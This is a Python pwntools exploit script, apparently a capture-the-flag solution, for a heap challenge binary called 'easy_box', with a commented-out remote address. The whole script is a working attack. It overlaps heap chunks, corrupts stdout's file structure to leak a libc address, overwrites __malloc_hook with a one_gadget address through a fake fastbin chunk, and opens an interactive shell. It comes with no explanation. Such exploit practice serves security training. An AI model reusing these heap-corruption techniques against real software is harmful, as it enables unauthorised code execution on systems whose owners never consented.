from pwn import *
context.log_level='debug'
p=process("./easy_box")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#p=remote("101.200.53.148","34521")
def add(idx,size,content):
    p.recvuntil(">>>\n")
    p.sendline("1")
    p.recvuntil("idx:\n")
    p.sendline(str(idx))
    p.recvuntil("len:\n")
    p.sendline(str(size))
    p.recvline()
    p.send(content)
def add_1(idx,size,content):
    p.sendline("1")
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(str(size))#68
    p.sendline(content)
def dele(idx):
    p.recvuntil(">>>\n")
    p.sendline("2")
    p.recvuntil("idx:\n")
    p.sendline(str(idx))
def dele_1(idx):
    p.sendline("2")
    p.recv()
    p.sendline(str(idx))
   

add(0,0x68,'a'*0x68)
add(1,0x78,'b'*0x78)
add(2,0x68,(p64(0)+p64(0x21))*6+'a'*8)
add(3,0x68,(p64(0)+p64(0x21))*6+'b'*8)
gdb.attach(p)

dele(0)
add(0,0x68,'a'*0x60+p64(0)+p8(0x81+0x70))
dele(1)
dele(2)
add(1,0x78,'A'*0x70+p64(0))
dele(0)
add(0,0x68,0x60*'a'+p64(0)+p8(0xa1))
dele(1)
add(1,0x98,p64(0)*15+p64(0x71)+p16(0x2620-0x43))
add(2,0x68,"\n")
#add(4,0x68,'\x00'*3+p64(0)*2+'\x00')

add(4,0x68,0x33*'a'+p64(0xfbad1800)+p64(0)*3+"\n")#4


#leak
IO_in=u64(p.recvuntil("Exit")[0x7e:0x7e+8])
libc_base=IO_in-libc.symbols["_IO_2_1_stdin_"]
one_gadget=libc_base+0xf1147
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
print hex(IO_in)

#get shell

p.sendline("1")
p.recv()
p.sendline('6')
p.recv()
p.sendline('104')#68
p.sendline("bbbb")
#p.sendline("2")
#p.recv()
#p.sendline(str(idx))
dele_1(2)
dele_1(3)
dele_1(6)
fake_chunk=malloc_hook-0x10-3
add_1(2,0x68,p64(fake_chunk))
add_1(3,0x68,'\x00')
add_1(6,0x68,'\x00')
add_1(7,0x68,'a'*3+p64(one_gadget))
add_1(8,72,'a'*4)
print hex(malloc_hook)
print hex(IO_in)
#gdb.attach(p)
p.interactive()


